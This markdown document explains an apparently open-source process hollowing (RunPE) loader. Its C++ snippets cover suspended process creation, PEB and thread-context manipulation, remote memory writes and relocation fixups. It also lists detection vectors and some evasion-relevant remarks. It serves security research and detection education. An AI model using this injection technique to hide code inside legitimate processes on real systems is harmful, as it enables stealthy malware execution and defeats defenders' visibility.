# Process Hollowing - Technical Deep Dive

## Overview

**Process Hollowing** (also known as **RunPE** or **Process Replacement**) is a code injection technique where:

1. A legitimate process is created in a **suspended state**
2. The original executable image is **unmapped** or **replaced**
3. A malicious/replacement PE image is **mapped** into the process memory
4. The **entry point** is redirected to the new image
5. The process is **resumed**, executing the replacement code

This implementation is a **x64 loader** capable of injecting into both **x86** and **x64** processes.

---

## Implementation Architecture

### Entry Point: `main()` (lines 702-902)

```
Command: runpe.exe <source_pe_file> <target_process_path>
```

**Flow:**

1. Load source PE into memory
2. Validate PE structure and architecture
3. Create target process (suspended)
4. Extract target process information
5. Validate compatibility (architecture + subsystem)
6. Choose injection method (with/without relocation)
7. Execute injection
8. Resume target process

---

## Step-by-Step Breakdown

### 1. PE File Loading (lines 26-66)

**Function:** `GetFileContent(lpFilePath)`

```cpp
HANDLE hFile = CreateFileA(lpFilePath, GENERIC_READ, ...);
DWORD dFileSize = GetFileSize(hFile, nullptr);
HANDLE hFileContent = HeapAlloc(GetProcessHeap(), 0, dFileSize);
ReadFile(hFile, hFileContent, dFileSize, ...);
```

**Purpose:** Load the entire source PE file into heap memory for manipulation.

---

### 2. PE Validation (lines 73-96)

**Functions:**

- `IsValidPE()`: Checks `IMAGE_NT_SIGNATURE` (0x4550 = "PE\0\0")
- `IsPE32()`: Checks `OptionalHeader.Magic` for x86 (0x10B) vs x64 (0x20B)

**PE Structure Navigation:**

```
DOS Header (e_lfanew) → NT Header → Optional Header → Sections
```

---

### 3. Target Process Creation (line 741)

```cpp
CreateProcessA(lpTargetProcess, nullptr, ..., CREATE_SUSPENDED, ..., &SI, &PI);
```

**Key Flag:** `CREATE_SUSPENDED` - Process is created but main thread is frozen.

**Result:** `PROCESS_INFORMATION` structure containing:

- `hProcess`: Process handle
- `hThread`: Main thread handle (suspended)
- `dwProcessId` / `dwThreadId`

---

### 4. Architecture Detection (lines 749-772)

**Check target architecture:**

```cpp
BOOL bTarget32;
IsWow64Process(PI.hProcess, &bTarget32);
```

- `bTarget32 = TRUE`: x86 process (running under WOW64 on x64 Windows)
- `bTarget32 = FALSE`: Native x64 process

---

### 5. Extract Process Information

#### For x86 Target (lines 103-114)

**Function:** `GetProcessAddressInformation32()`

```cpp
WOW64_CONTEXT CTX = {};
CTX.ContextFlags = CONTEXT_FULL;
Wow64GetThreadContext(lpPI->hThread, &CTX);

// PEB address is in EBX register
LPVOID pPEB = (LPVOID)(uintptr_t)CTX.Ebx;

// ImageBase is at PEB+0x8
ReadProcessMemory(lpPI->hProcess,
                  (LPVOID)(CTX.Ebx + 0x8),
                  &lpImageBaseAddress,
                  sizeof(DWORD), nullptr);
```

**Key Points:**

- **EBX** register points to PEB (Process Environment Block)
- **PEB+0x8** contains ImageBaseAddress for x86 processes
- Uses WOW64 APIs for cross-architecture access

#### For x64 Target (lines 121-132)

**Function:** `GetProcessAddressInformation64()`

```cpp
CONTEXT CTX = {};
CTX.ContextFlags = CONTEXT_FULL;
GetThreadContext(lpPI->hThread, &CTX);

// PEB address is in RDX register
LPVOID pPEB = (LPVOID)CTX.Rdx;

// ImageBase is at PEB+0x10
ReadProcessMemory(lpPI->hProcess,
                  (LPVOID)(CTX.Rdx + 0x10),
                  &lpImageBaseAddress,
                  sizeof(UINT64), nullptr);
```

**Key Points:**

- **RDX** register points to PEB
- **PEB+0x10** contains ImageBaseAddress for x64 processes

---

### 6. Compatibility Checks

#### Architecture Compatibility (lines 777-794)

```
Source PE     Target Process     Result
-----------------------------------------
x86           x86                ✓ Compatible
x64           x64                ✓ Compatible
x86           x64                ✗ Incompatible
x64           x86                ✗ Incompatible
```

#### Subsystem Compatibility (lines 796-833)

**Functions:**

- `GetSubsytem32/64()`: Read subsystem from PE file headers
- `GetSubsystemEx32/64()`: Read subsystem from remote process memory

**Common Subsystems:**

- `IMAGE_SUBSYSTEM_WINDOWS_GUI` (2): GUI application
- `IMAGE_SUBSYSTEM_WINDOWS_CUI` (3): Console application

**Why it matters:** GUI apps can't directly replace console apps and vice versa without issues.

---

### 7. Relocation Table Detection (lines 254-277)

**Functions:**

- `HasRelocation32/64()`: Check if `DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0`

**Two scenarios:**

#### Scenario A: No Relocation Table

- PE **must** be loaded at its preferred `ImageBase`
- If that address is occupied → injection fails
- More rigid, but no patching needed

#### Scenario B: Has Relocation Table

- PE can be loaded at **any** address
- Requires **runtime relocation fixups**
- More flexible, works even if preferred base is unavailable

---

## Injection Methods

### Method 1: Without Relocation (`RunPE32/64`, lines 315-457)

**Steps:**

1. **Allocate at preferred base:**

```cpp
lpAllocAddress = VirtualAllocEx(
    lpPI->hProcess,
    (LPVOID)lpImageNTHeader->OptionalHeader.ImageBase,  // Exact address
    lpImageNTHeader->OptionalHeader.SizeOfImage,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);
```

2. **Write PE Headers:**

```cpp
WriteProcessMemory(lpPI->hProcess, lpAllocAddress,
                   lpImage,
                   lpImageNTHeader->OptionalHeader.SizeOfHeaders,
                   nullptr);
```

3. **Write Each Section:**

```cpp
for (int i = 0; i < lpImageNTHeader->FileHeader.NumberOfSections; i++) {
    PIMAGE_SECTION_HEADER section = ...;
    WriteProcessMemory(
        lpPI->hProcess,
        (LPVOID)(lpAllocAddress + section->VirtualAddress),
        (LPVOID)(lpImage + section->PointerToRawData),
        section->SizeOfRawData,
        nullptr
    );
}
```

**Note:** `PointerToRawData` (file offset) → `VirtualAddress` (memory RVA)

4. **Update PEB ImageBase:**

```cpp
// x86:
WriteProcessMemory(lpPI->hProcess,
                   (LPVOID)(CTX.Ebx + 0x8),     // PEB+0x8
                   &ImageBase,
                   sizeof(DWORD), nullptr);

// x64:
WriteProcessMemory(lpPI->hProcess,
                   (LPVOID)(CTX.Rdx + 0x10),    // PEB+0x10
                   &ImageBase,
                   sizeof(DWORD64), nullptr);
```

5. **Set Entry Point and Resume:**

```cpp
// x86:
CTX.Eax = (DWORD)(lpAllocAddress + AddressOfEntryPoint);
Wow64SetThreadContext(lpPI->hThread, &CTX);

// x64:
CTX.Rcx = (DWORD64)(lpAllocAddress + AddressOfEntryPoint);
SetThreadContext(lpPI->hThread, &CTX);

ResumeThread(lpPI->hThread);
```

**Why these registers?**

- **EAX/RCX**: Windows loader convention - entry point address
- When thread resumes, it jumps to this address

---

### Method 2: With Relocation (`RunPEReloc32/64`, lines 465-700)

**Additional Steps for Relocation:**

1. **Allocate at any available address:**

```cpp
lpAllocAddress = VirtualAllocEx(
    lpPI->hProcess,
    nullptr,  // Let system choose address
    lpImageNTHeader->OptionalHeader.SizeOfImage,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);
```

2. **Calculate Delta:**

```cpp
DeltaImageBase = (DWORD64)lpAllocAddress - lpImageNTHeader->OptionalHeader.ImageBase;
```

3. **Update ImageBase in headers:**

```cpp
lpImageNTHeader->OptionalHeader.ImageBase = (DWORD64)lpAllocAddress;
```

4. **Write headers + sections** (same as Method 1)

5. **Process Relocation Table (lines 522-545 for x86, 644-667 for x64):**

**Relocation Structure:**

```
.reloc section contains:
  IMAGE_BASE_RELOCATION blocks (one per page)
    ├─ VirtualAddress: RVA of the page
    ├─ SizeOfBlock: Total size including entries
    └─ Entries[]: Array of relocation entries
         ├─ Offset (12 bits): Offset within page
         └─ Type (4 bits): Relocation type
```

**Processing Logic:**

```cpp
DWORD RelocOffset = 0;
while (RelocOffset < ImageDataReloc.Size) {
    PIMAGE_BASE_RELOCATION block = ...;
    DWORD numEntries = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))
                       / sizeof(IMAGE_RELOCATION_ENTRY);

    for (DWORD i = 0; i < numEntries; i++) {
        PIMAGE_RELOCATION_ENTRY entry = ...;

        if (entry->Type == 0) continue;  // Padding

        // Calculate address to patch
        DWORD64 patchAddr = lpAllocAddress
                          + block->VirtualAddress
                          + entry->Offset;

        // Read current value from remote process
        DWORD64 value;
        ReadProcessMemory(lpPI->hProcess, (LPVOID)patchAddr,
                         &value, sizeof(DWORD64), nullptr);

        // Apply delta
        value += DeltaImageBase;

        // Write back
        WriteProcessMemory(lpPI->hProcess, (LPVOID)patchAddr,
                          &value, sizeof(DWORD64), nullptr);
    }
}
```

**What's being patched?**

- Absolute addresses in the code/data that reference memory locations
- E.g., global variable pointers, function pointers, vtables
- Each gets adjusted by `DeltaImageBase`

6. **Update PEB + Set Entry Point + Resume** (same as Method 1)

---

## Cross-Architecture Support (x64 → x86)

This loader is **x64** but can inject into **x86** processes via **WOW64** (Windows on Windows 64).

### Key Differences

| Aspect                   | x86 API                   | x64 API              |
| ------------------------ | ------------------------- | -------------------- |
| **Context Structure**    | `WOW64_CONTEXT`           | `CONTEXT`            |
| **Get Context**          | `Wow64GetThreadContext()` | `GetThreadContext()` |
| **Set Context**          | `Wow64SetThreadContext()` | `SetThreadContext()` |
| **PEB Register**         | `EBX`                     | `RDX`                |
| **ImageBase Offset**     | PEB + 0x8                 | PEB + 0x10           |
| **Entry Point Register** | `EAX`                     | `RCX`                |
| **Pointer Size**         | 4 bytes (DWORD)           | 8 bytes (DWORD64)    |

### Why Two Sets of Functions?

The code duplicates logic for x86/x64:

- `RunPE32` vs `RunPE64`
- `GetProcessAddressInformation32` vs `64`
- `GetSubsytem32` vs `64`
- etc.

**Reason:** Different pointer sizes and register conventions require type-safe handling.

---

## Security Implications

### Detection Vectors

1. **Suspended Process Creation**

   - Behavioral detection: legitimate processes rarely start suspended
   - Mitigation: Some variants use `CreateProcess` normally then suspend immediately

2. **Remote Memory Writes**

   - `WriteProcessMemory` to another process
   - Large consecutive writes (full PE image)
   - Mitigation: EDR/AV monitors cross-process memory operations

3. **PEB Manipulation**

   - Writing to PEB is unusual for non-debugger processes
   - Mitigation: Defenders monitor PEB writes

4. **Entry Point Modification**

   - Thread context manipulation before first instruction
   - Mitigation: Some EDRs hook `SetThreadContext`

5. **Missing `NtUnmapViewOfSection`**
   - This implementation doesn't explicitly unmap the original image
   - Classic hollowing calls `NtUnmapViewOfSection` first
   - Absence might help avoid some signatures

### Limitations

1. **No Import Resolution**

   - Assumes source PE is self-contained or relies on target's imports
   - Won't work if source requires DLLs not loaded by target

2. **No TLS Callbacks**

   - Thread Local Storage callbacks aren't processed
   - May cause issues for some executables

3. **Memory Permissions**

   - Uses `PAGE_EXECUTE_READWRITE` for simplicity
   - Proper implementation should set per-section permissions (.text = RX, .data = RW)
   - RWX pages are suspicious to security tools

4. **No ASLR Bypass**
   - If no relocation table and preferred base is taken → fails
   - Could be enhanced with `NtUnmapViewOfSection` to free the address

---

## Windows Internals Reference

### Process Environment Block (PEB)

**Location:**

- Thread context contains pointer to PEB
- x86: `EBX` register points to PEB in suspended state
- x64: `RDX` register points to PEB in suspended state

**Relevant PEB Fields:**

```cpp
typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PPEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    // ...
    PVOID ImageBaseAddress;  // x86: offset 0x8, x64: offset 0x10
    // ...
} PEB;
```

### PE Format Quick Reference

```
PE File Structure:
+---------------------------+
| DOS Header                |  e_magic = 'MZ'
| DOS Stub                  |  e_lfanew → NT Header offset
+---------------------------+
| NT Headers                |  Signature = 'PE\0\0'
|   - File Header           |  Machine, NumberOfSections
|   - Optional Header       |  ImageBase, AddressOfEntryPoint
|     - Data Directories    |  Import, Export, Reloc, etc.
+---------------------------+
| Section Headers           |  .text, .data, .reloc, etc.
+---------------------------+
| Sections (file data)      |
+---------------------------+

Memory Layout (mapped):
+---------------------------+
| Headers                   |  RVA 0
+---------------------------+
| .text (code)              |  RVA varies
+---------------------------+
| .data (initialized data)  |
+---------------------------+
| .reloc (relocations)      |
+---------------------------+
```

### Key NT/Win32 APIs Used

**Process/Thread Management:**

- `CreateProcessA()`: Create process in suspended state
- `TerminateProcess()`: Kill process on error
- `ResumeThread()`: Start/resume thread execution

**Memory Operations:**

- `VirtualAllocEx()`: Allocate memory in remote process
- `WriteProcessMemory()`: Write to remote process memory
- `ReadProcessMemory()`: Read from remote process memory

**Context Manipulation:**

- `GetThreadContext()` / `Wow64GetThreadContext()`: Read thread registers
- `SetThreadContext()` / `Wow64SetThreadContext()`: Modify thread registers

**File Operations:**

- `CreateFileA()`: Open PE file
- `ReadFile()`: Read PE into buffer
- `GetFileSize()`: Get file size
- `HeapAlloc()` / `HeapFree()`: Allocate/free memory

**Architecture Detection:**

- `IsWow64Process()`: Check if process is 32-bit on 64-bit Windows

---

## Usage Example

```powershell
# Inject calc.exe into notepad.exe process
.\runpe.exe C:\Windows\System32\calc.exe C:\Windows\System32\notepad.exe

# What happens:
# 1. notepad.exe is created (suspended)
# 2. calc.exe is mapped into notepad's memory
# 3. notepad's entry point redirected to calc.exe code
# 4. Process resumes → calc.exe runs in "notepad.exe" process
```

**Result:** Task Manager shows "notepad.exe" but it executes calc.exe code.

---

## Code Quality Notes

### Good Practices

✓ Proper error checking on Windows API calls  
✓ Consistent architecture handling (x86/x64 branches)  
✓ Clean separation of concerns (validation, allocation, writing, relocation)  
✓ Comprehensive compatibility checks before injection

### Potential Improvements

1. **Use `NtUnmapViewOfSection`** to explicitly unmap original image
2. **Set proper page permissions** (RX for .text, RW for .data) instead of RWX
3. **Process imports manually** for more complex scenarios
4. **Handle TLS callbacks** if needed
5. **Better error messages** with `GetLastError()` codes
6. **RAII/smart pointers** instead of manual `CloseHandle`/`HeapFree`
7. **Unicode support** (`CreateProcessW` instead of `CreateProcessA`)

---

## Comparison with Malware Variants

**This Implementation:**

- Educational/proof-of-concept quality
- Straightforward logic, well-commented
- No obfuscation or anti-analysis
- No explicit unmap step

**Real-World Malware:**

- Often uses `NtUnmapViewOfSection` for cleaner hollowing
- May include anti-debugging checks
- Obfuscated API calls (dynamic loading, string encryption)
- Additional persistence mechanisms
- May hollow legitimate signed binaries for trust exploitation

---

## References

- [Microsoft PE Format Documentation](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)
- [Process Hollowing Technique Overview](https://attack.mitre.org/techniques/T1055/012/)
- Related Project: [PE-Explorer](https://github.com/adamhlt/PE-Explorer) - for understanding PE structure

---

## Conclusion

This is a **well-structured educational implementation** of Process Hollowing that:

- Demonstrates core Windows internals (PEB, thread context, PE format)
- Handles both x86 and x64 architectures from a single x64 loader
- Supports PE files with and without relocation tables
- Provides a foundation for understanding code injection techniques

While not production-grade (lacks import resolution, TLS handling, proper memory permissions), it clearly illustrates the fundamental steps of process replacement and is valuable for security research and reverse engineering education.
